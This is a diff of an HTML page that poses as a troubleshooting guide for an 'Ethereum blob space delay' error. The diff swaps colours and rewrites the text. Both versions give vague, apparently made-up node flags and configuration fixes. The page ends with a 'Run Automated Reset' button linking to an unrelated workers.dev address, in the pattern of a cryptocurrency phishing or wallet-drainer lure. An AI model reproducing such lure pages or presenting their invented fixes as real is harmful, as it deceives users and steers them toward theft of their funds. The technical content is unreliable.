@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an "Ethereum blob space delay".</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to excessive data storage.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to excessive blob data being stored on the Ethereum network, leading to slower transaction processing times and increased gas costs.</li>
+<li>The error occurs due to the Ethereum network's limitations on storing and processing large amounts of data, particularly with the introduction of Ethereum Improvement Proposals (EIPs) that manage data storage more efficiently but can lead to temporary bottlenecks.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the <code>--blobstore.capacity</code> configuration option to allocate more space for blob storage.</li>
-<li>Run a node with the <code>--clear.blobstore</code> flag to clear existing blob data and free up space.</li>
-<li>Configure the <code>eth.blobstore</code> settings in the node configuration file, as shown in the following code block:</li>
+<li>Increase the <code>--http.cache.size</code> parameter to allow for more data caching:</li>
+<li>Update Ethereum client configuration to prioritize data processing</li>
+<li>Utilize off-chain storage solutions for less critical data</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;eth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;blobstore&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;capacity&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1073741824</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--http.cache.size<span class="w"> </span><span class="m">1024</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced configuration and troubleshooting options.</p>
+<p>Consider accessing the Ethereum network through an alternative interface for more direct control over transaction processing. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node software installed and configured</li>
+<li>Ethereum client (e.g., Geth) installed and configured</li>
 <li>Basic understanding of Ethereum network architecture</li>
-<li>Administrative access to the node configuration files</li>
+<li>Familiarity with command-line interfaces for Ethereum client management</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
